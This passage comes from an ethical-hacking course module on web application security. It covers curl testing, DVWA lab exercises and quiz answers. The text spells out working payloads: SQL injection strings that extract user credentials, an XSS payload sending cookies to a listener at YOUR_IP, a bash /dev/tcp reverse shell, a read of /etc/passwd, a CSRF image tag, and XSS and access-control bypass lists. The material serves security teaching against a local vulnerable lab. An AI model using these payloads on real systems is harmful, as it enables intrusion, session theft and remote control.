Curl is essential for quick, manual HTTP testing:

```bash
# Basic GET request with headers
curl -v https://target.com

# POST request with data
curl -X POST https://target.com/login \
     -d "username=admin&password=test"

# POST with JSON
curl -X POST https://target.com/api/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"test"}'

# Include cookies
curl -b "session=abc123" https://target.com/dashboard

# Save and send cookies
curl -c cookies.txt https://target.com/login
curl -b cookies.txt https://target.com/dashboard

# Follow redirects
curl -L https://target.com

# Custom headers
curl -H "Authorization: Bearer eyJ..." \
     -H "X-Custom-Header: value" \
     https://target.com/api/data

# Show only response headers
curl -I https://target.com

# PUT request (test for unauthorized writes)
curl -X PUT https://target.com/api/users/42 \
     -H "Content-Type: application/json" \
     -d '{"role":"admin"}'

# DELETE request
curl -X DELETE https://target.com/api/users/42

# Upload file
curl -X POST https://target.com/upload \
     -F "file=@shell.php"

# Through proxy (Burp Suite)
curl --proxy http://127.0.0.1:8080 https://target.com

# Ignore SSL errors (for self-signed certs in labs)
curl -k https://target.com

# Timing information
curl -w "Connect: %{time_connect}s\nTTFB: %{time_starttransfer}s\nTotal: %{time_total}s\n" \
     -o /dev/null -s https://target.com
```

---

## 9.7 Hands-On Exercises with DVWA

{: .warning }
> These exercises use DVWA (Damn Vulnerable Web Application), an intentionally vulnerable application. **Never deploy DVWA on a public server.** Run it locally in Docker or in your Kali VM only.

**Setting up DVWA:**

```bash
# Docker (recommended)
docker run --rm -it -p 8080:80 vulnerables/web-dvwa

# Access at http://localhost:8080
# Default credentials: admin / password
# Click "Create / Reset Database" on first run
# Set security level to "Low" to start, then increase

# Alternative: Install in Kali VM
sudo apt install dvwa
```

---

{: .exercise }
> **Exercise 1: SQL Injection (A03)**
>
> **Objective:** Extract all usernames and passwords from the DVWA database using SQL injection.
>
> **Steps:**
> 1. Navigate to DVWA > SQL Injection (Security: Low)
> 2. Enter `1` in the User ID field to see normal behavior
> 3. Enter `' OR '1'='1` to test for injection
> 4. Determine the number of columns: `1' UNION SELECT NULL,NULL-- -`
> 5. Extract the database version: `1' UNION SELECT NULL,version()-- -`
> 6. List all tables: `1' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()-- -`
> 7. List columns in the `users` table: `1' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'-- -`
> 8. Extract credentials: `1' UNION SELECT user,password FROM users-- -`
> 9. Crack the MD5 hashes using an online tool or `hashcat`
>
> **Bonus:** Repeat at Medium and High security levels. Note how the protections change and how to bypass them.
>
> <details>
> <summary>Hints</summary>
>
> - At Low level, the input is directly concatenated into the query with no filtering
> - The query uses single quotes around the input value
> - There are 2 columns in the original query (first_name and surname)
> - The database is MySQL, so use `-- -` (with a space after `--`) to comment
> - At Medium level, the input is passed through `mysql_real_escape_string()` but the query uses numeric input without quotes -- so no quotes are needed in the payload
> - At High level, input comes from a different page via session -- use the same techniques but input through the popup window
>
> </details>

---

{: .exercise }
> **Exercise 2: Cross-Site Scripting -- Reflected (A03)**
>
> **Objective:** Demonstrate reflected XSS by stealing a cookie and understand filter evasion.
>
> **Steps:**
> 1. Navigate to DVWA > XSS (Reflected) (Security: Low)
> 2. Enter `<script>alert(document.cookie)</script>` in the name field
> 3. Observe the alert with your session cookie
> 4. Increase to Medium security and try the same payload -- it will be filtered
> 5. Bypass the filter: try `<Script>alert(document.cookie)</Script>` or `<img src=x onerror=alert(document.cookie)>`
> 6. Increase to High security and find a working bypass
> 7. Craft a cookie-stealing payload: `<img src=x onerror="new Image().src='http://YOUR_IP:8888/?c='+document.cookie">`
> 8. Set up a listener: `python3 -m http.server 8888`
> 9. Check the listener for the captured cookie
>
> <details>
> <summary>Hints</summary>
>
> - Low: No filtering at all
> - Medium: Uses `str_replace()` to remove `<script>` tags -- case-sensitive only
> - High: Uses regex to remove `<script>` with case-insensitive flag -- use non-script tags like `<img>`, `<svg>`, `<body>`
> - For the cookie-stealing payload, make sure your listener IP is reachable from the browser running DVWA
>
> </details>

---

{: .exercise }
> **Exercise 3: Broken Access Control (A01) -- IDOR via Burp Suite**
>
> **Objective:** Use Burp Suite to discover and exploit an IDOR vulnerability.
>
> **Steps:**
> 1. Configure your browser to proxy through Burp Suite (127.0.0.1:8080)
> 2. Log into DVWA and browse to any page
> 3. In Burp, go to Proxy > HTTP History and find requests containing user-specific data
> 4. Look at the URL parameter structure (e.g., `?id=1`)
> 5. Right-click the request and send it to Repeater
> 6. Change the `id` parameter to other values (2, 3, 4, etc.)
> 7. Observe whether you can access other users' data
> 8. Use Intruder to automate: set the id as a payload position, use a number range (1-100)
> 9. Sort Intruder results by response length to identify valid IDs
> 10. Document which user records you accessed without authorization
>
> <details>
> <summary>Hints</summary>
>
> - The SQL Injection page in DVWA also demonstrates IDOR: changing the `id` parameter retrieves different user records
> - In Intruder, use Payload Type "Numbers" with From: 1, To: 100, Step: 1
> - Sort by response length -- valid IDs return longer responses with user data
> - In a real engagement, you would test every parameter that references a specific object
>
> </details>

---

{: .exercise }
> **Exercise 4: Command Injection (A03)**
>
> **Objective:** Achieve remote code execution through command injection.
>
> **Steps:**
> 1. Navigate to DVWA > Command Injection (Security: Low)
> 2. Enter a valid IP address (e.g., `127.0.0.1`) and observe the `ping` output
> 3. Try: `127.0.0.1; whoami` -- observe the command output appended to the ping results
> 4. Try: `127.0.0.1; cat /etc/passwd`
> 5. Try: `127.0.0.1; ls -la /var/www/html/`
> 6. Establish a reverse shell:
>    - Set up listener: `nc -lvnp 4444`
>    - Inject: `127.0.0.1; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1`
> 7. Increase to Medium security and test the same payloads
> 8. At Medium level, `&&` and `;` are filtered -- try `|` or `||` instead
> 9. At High level, identify what characters are filtered and find a bypass
>
> <details>
> <summary>Hints</summary>
>
> - Low: No filtering -- any shell metacharacter works (`;`, `|`, `&&`, `||`)
> - Medium: Filters `&&` and `;` -- use `|` (pipe) which passes output of ping as input to your command
> - High: Filters many characters but check carefully for spaces in the filter list -- `|` with no surrounding spaces may not be filtered (`127.0.0.1|whoami`)
> - If the reverse shell does not connect, check if the DVWA container/VM can reach your IP
>
> </details>

---

{: .exercise }
> **Exercise 5: CSRF (A01) and Security Misconfiguration (A05)**
>
> **Objective:** Exploit CSRF to change the admin password and identify security misconfigurations.
>
> **Steps:**
>
> **Part A -- CSRF:**
> 1. Navigate to DVWA > CSRF (Security: Low)
> 2. Change the password to "test123" normally and observe the request in Burp
> 3. Notice it is a GET request: `/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change`
> 4. Create an HTML page that auto-submits the password change:
>    ```html
>    <img src="http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">
>    ```
> 5. Open this HTML file in the same browser where you are logged into DVWA
> 6. Verify the password was changed to "hacked"
>
> **Part B -- Security Misconfiguration:**
> 7. Check for phpinfo: `http://localhost:8080/phpinfo.php`
> 8. Browse to `http://localhost:8080/config/` -- is directory listing enabled?
> 9. Check for default credentials on the login page (admin/password)
> 10. Examine response headers for missing security headers
> 11. Check if debug/error information is exposed when you trigger errors
>
> <details>
> <summary>Hints</summary>
>
> - At Low level, there is no CSRF token -- the form uses a simple GET request
> - At Medium level, the server checks the Referer header -- you can bypass by hosting your CSRF page on the same server or manipulating the Referer
> - At High level, a CSRF token is added -- you need to combine CSRF with XSS to first steal the token, then submit the forged request
> - For security misconfiguration, DVWA intentionally has many issues: exposed phpinfo, weak credentials, missing headers, verbose errors
>
> </details>

---

## 9.8 Knowledge Check

Test your understanding of web application security concepts.

**Question 1:** What is the difference between Stored XSS and Reflected XSS?

<details>
<summary>Show Answer</summary>

**Stored (Persistent) XSS** saves the malicious script permanently on the target server (e.g., in a database). Every user who views the affected page executes the script. **Reflected XSS** requires the victim to click a crafted link -- the malicious script is reflected off the server in the immediate response (e.g., in a search result) but is not stored. Stored XSS is generally more dangerous because it does not require user interaction beyond normal browsing and can affect many users simultaneously.

</details>

**Question 2:** Explain the difference between Union-based and Blind SQL injection. When would you use each?

<details>
<summary>Show Answer</summary>

**Union-based SQLi** uses the `UNION SELECT` statement to append additional queries to the original, extracting data directly in the response. It requires the application to display query results in the page. **Blind SQLi** is used when the application does not display query results or error messages. Boolean-based blind SQLi infers data from true/false differences in the response (e.g., page content changes). Time-based blind SQLi infers data from response delays (e.g., `SLEEP(5)`). Union-based is faster and more efficient; blind SQLi is used when there is no visible output channel.

</details>

**Question 3:** What is SSRF and why is it particularly dangerous in cloud environments?

<details>
<summary>Show Answer</summary>

**Server-Side Request Forgery (SSRF)** occurs when an attacker can make the server send requests to unintended locations. It is particularly dangerous in cloud environments because cloud providers expose instance metadata services at `169.254.169.254`. Through SSRF, an attacker can access this metadata to steal temporary cloud credentials (IAM roles), access tokens, and configuration data. These credentials can then be used to access other cloud services (S3 buckets, databases, etc.), potentially leading to full cloud infrastructure compromise. The 2019 Capital One breach is a well-known example of this attack.

</details>

**Question 4:** What does the `HttpOnly` flag on a cookie prevent, and what attack does it mitigate?

<details>
<summary>Show Answer</summary>

The `HttpOnly` flag prevents JavaScript from accessing the cookie via `document.cookie`. This mitigates **Cross-Site Scripting (XSS) cookie theft** -- even if an attacker achieves XSS on the page, they cannot read session cookies marked as HttpOnly. However, HttpOnly does not prevent CSRF attacks (the browser still sends HttpOnly cookies with cross-origin requests), and it does not prevent all XSS attacks (the attacker can still perform actions in the user's context; they just cannot exfiltrate the cookie value directly).

</details>

**Question 5:** You receive a `403 Forbidden` response when trying to access `/admin`. List at least five techniques you might try to bypass this restriction.

<details>
<summary>Show Answer</summary>

1. **HTTP method switching** -- Try POST, PUT, PATCH instead of GET
2. **Path manipulation** -- Try `/admin/`, `/admin/.`, `/./admin`, `/admin..;/`, `//admin`
3. **URL encoding** -- Try `/%61dmin`, `/admin%00`, `/admin%20`
4. **Header injection** -- Add `X-Forwarded-For: 127.0.0.1`, `X-Original-URL: /admin`, `X-Rewrite-URL: /admin`
5. **Case variation** -- Try `/Admin`, `/ADMIN`, `/aDmIn`
6. **HTTP version downgrade** -- Try `HTTP/1.0` instead of `HTTP/1.1`
7. **Different Content-Type** -- Some frameworks route differently based on Content-Type
8. **API version** -- Try `/api/v1/admin`, `/api/v2/admin`
9. **Protocol-level bypass** -- Try accessing directly via IP instead of hostname
10. **Verb tampering** -- Use an arbitrary method like `FOO /admin`

</details>

**Question 6:** What is the Same-Origin Policy, and how does CORS relate to it?

<details>
<summary>Show Answer</summary>

The **Same-Origin Policy (SOP)** is a browser security mechanism that prevents JavaScript on one origin (scheme + host + port) from reading responses from a different origin. This prevents a malicious website from reading your authenticated data from another site. **CORS (Cross-Origin Resource Sharing)** is a controlled relaxation of SOP that allows servers to specify which origins are permitted to read their responses by setting `Access-Control-Allow-Origin` and related headers. CORS does not block requests -- it blocks the browser from reading responses. Misconfigured CORS (e.g., reflecting any origin with credentials) can negate the protection SOP provides.

</details>

**Question 7:** Describe three different types of authentication token attacks against JWT.

<details>
<summary>Show Answer</summary>

1. **Algorithm None attack** -- The attacker modifies the JWT header to set `"alg": "none"` and removes the signature. If the server does not properly validate the algorithm, it accepts the unsigned token, allowing the attacker to forge arbitrary claims.
2. **Algorithm confusion (RS256 to HS256)** -- If the server uses RS256 (asymmetric), the attacker changes the algorithm to HS256 (symmetric) and signs the token using the server's public key as the HMAC secret. Since the server uses the same key (public key) to verify, the forged signature is accepted.
3. **Secret brute-forcing** -- If the HMAC secret is weak, the attacker can use tools like `hashcat` or `jwt_tool` to brute-force the secret key, allowing them to forge valid tokens with arbitrary claims.

</details>

**Question 8:** What is the difference between horizontal and vertical privilege escalation? Give an example of each in a web application context.

<details>
<summary>Show Answer</summary>

**Horizontal privilege escalation** means accessing resources belonging to another user at the same privilege level. Example: User A (regular user) changes a URL parameter from `/api/orders/101` (their order) to `/api/orders/102` (User B's order) and can view User B's order details. **Vertical privilege escalation** means gaining access to functionality reserved for a higher privilege level. Example: A regular user discovers that the admin panel at `/admin/users` does not check authorization and can create, modify, or delete other user accounts -- functions only administrators should have.

</details>

**Question 9:** You are testing a web application that appears to filter `<script>` tags from user input. List at least four alternative XSS payloads you would try.

<details>
<summary>Show Answer</summary>

1. `<img src=x onerror=alert(1)>` -- Uses image error event handler
2. `<svg onload=alert(1)>` -- Uses SVG element's onload event
3. `<body onload=alert(1)>` -- Uses body element's onload event
4. `<input autofocus onfocus=alert(1)>` -- Triggers on auto-focus
5. `<details open ontoggle=alert(1)>` -- Uses HTML5 details element
6. `<ScRiPt>alert(1)</ScRiPt>` -- Mixed case to bypass case-sensitive filters
7. `<scr<script>ipt>alert(1)</scr</script>ipt>` -- Nested tags if filter removes once
8. `<a href="javascript:alert(1)">click</a>` -- JavaScript protocol handler
9. `<div onmouseover="alert(1)">hover me</div>` -- Mouse event handler
10. `<iframe src="data:text/html,<script>alert(1)</script>">` -- Data URI in iframe

</details>

**Question 10:** Explain how SQLMap's tamper scripts work and when you would use them. Name three specific tamper scripts and what they do.

<details>
<summary>Show Answer</summary>

SQLMap **tamper scripts** are Python modules that modify the injection payload before it is sent, helping bypass Web Application Firewalls (WAFs) and input filters. You use them when basic payloads are being blocked by security controls. Three specific tamper scripts:

1. **`space2comment`** -- Replaces space characters with SQL comments (`/**/`). Useful when WAFs block spaces in SQL queries. Example: `UNION SELECT` becomes `UNION/**/SELECT`.
2. **`randomcase`** -- Randomizes the case of SQL keywords. Example: `SELECT` might become `sElEcT`. Useful when WAFs perform case-sensitive keyword matching.
3. **`between`** -- Replaces greater-than (`>`) comparisons with `NOT BETWEEN 0 AND` expressions. Useful when WAFs block comparison operators. Example: `id>1` becomes `id NOT BETWEEN 0 AND 1`.

You can chain multiple tamper scripts: `--tamper=space2comment,randomcase,between`. Always start without tamper scripts and add them only if payloads are being blocked.

</details>

---

## Summary

Web application security is one of the broadest and most critical domains in ethical hacking. In this module, you covered:

- **HTTP fundamentals** -- Methods, headers, status codes, cookies, sessions, and TLS
- **The OWASP Top 10 (2021)** -- All ten categories with detection, exploitation, and remediation
- **SQL injection** -- From basic union-based to advanced blind and out-of-band techniques, plus SQLMap automation
- **XSS** -- Reflected, stored, DOM-based, practical payloads, BeEF, and filter evasion
- **CSRF** -- Attack mechanics, testing methodology, and prevention
- **Burp Suite** -- Proxy setup, Repeater, Intruder, Scanner, extensions, and workflow
- **Additional tools** -- ZAP, wfuzz, ffuf, Nuclei, and curl for manual testing
- **Hands-on exercises** -- Practical exploitation against DVWA

{: .tip }
> Web application security requires constant practice. Set up DVWA, WebGoat, Juice Shop, and HackTheBox web challenges to keep your skills sharp. The PortSwigger Web Security Academy (free) provides excellent structured labs covering every topic in this module.

---

**Next Module:** [Module 10 -- Wireless Security](10-wireless-security/) -- WiFi hacking, Bluetooth attacks, and wireless security testing with aircrack-ng.
